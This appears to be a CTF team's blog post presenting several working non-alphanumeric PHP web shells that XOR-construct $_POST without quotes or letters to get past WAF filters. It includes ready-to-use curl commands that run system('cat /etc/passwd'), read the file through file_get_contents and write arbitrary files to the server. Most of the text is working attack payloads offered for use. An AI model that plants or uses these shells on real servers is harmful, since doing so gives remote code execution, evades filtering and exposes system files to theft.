# Non-Alphanumeric WebShell in PHP

The main goal of a php shell is that you can execute code on the server from the outside.

This can happen via a normal eval shell or with a tiny shell like this:
```php
<?=`$_GET[1]`?>
```
The downside is that the most WAFs at a CTF filter alot of available chars out to make the exploitation harder.

Common chars to be blocked or filtered are 
```
"'`a-zA-Z
```

To be still able to deploy a working shell there are a few things we need to do.

At first there are already non-alphanumeric shells out in the wild but the ones i have seen had one thing in common they needed Quotation marks to create a string once to craft letters out of it.

So I thought to myself, that it would be a quite cool idea to develope a shell which could avoid that and still work the same way.
Thats the first Solution i came up with:

```php
<?=0;$_=[];$_.=[];$_=${(($_[0]^(0 .$_[1]))^(($_[0]^(6 .$_[1]))^($_[3]^(8 .$_[1])))).($_[3]^(1 .$_[1])).($_[4]^(6 .$_[1])).($_[3]^(2 .$_[1])).($_[3]^(5 .$_[1]))};$_[0]($_[1]);
```

Not optimal at all but it works, it crafts a string element at the start from an Array which results in a string with the value "Array" which then can be crafted in \_POST by the xor operator.

| Char X | Char Y | Result |
| - | - | - |
| A | 0 | q |
| A | 6 | w |
| q | w | . |
| a | 8 | Y |
| . | Y | _ |
| a | 1 | P |
| y | 6 | O |
| a | 2 | S |
| a | 5 | T |

Which resulted in \_POST and then can be used to run functions with arguments over code. (This feature is present since php7)

Like this:

```php
// $_ is $_POST
$_[0]($_[1]);
```

Thats quite cool but its so fucking huge so i tough i would optimize the hell out of it. So here is my Minified version of it.

```php
<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
```

So you can send a request such as ```0=system&1_=cat /etc/passwd```

The downside is that if you dont have access to the system function you got no return values
so here is another slightly bigger variation of the shell which will print the result of a function.

```php
<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2]));
```

So you can send a request such as ```0=print_r&1=file_get_contents&2_=/etc/passwd```

Here are small curl snippets for you lazy folks to work with the shell :D

```bash
curl https://host.ctf.com/shell.php -X POST -F "0=system" -F "1=cat /etc/passwd" # Shell 1
curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=file_get_contents" -F "2=/etc/passwd" # Shell 2
```

The full tryhard shell can be archived with this snipped:

```php
<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2], $_[3]));
```

With this setup we can run any function with as much arguments as we like.


```bash
curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=call_user_func_array" -F "2=file_put_contents" -F "3[]=hello.txt" -F "3[]=testcontent"
```


Cli-Ish over and out.

PS: Checkout our cool team page https://pwnprophecy.tk)
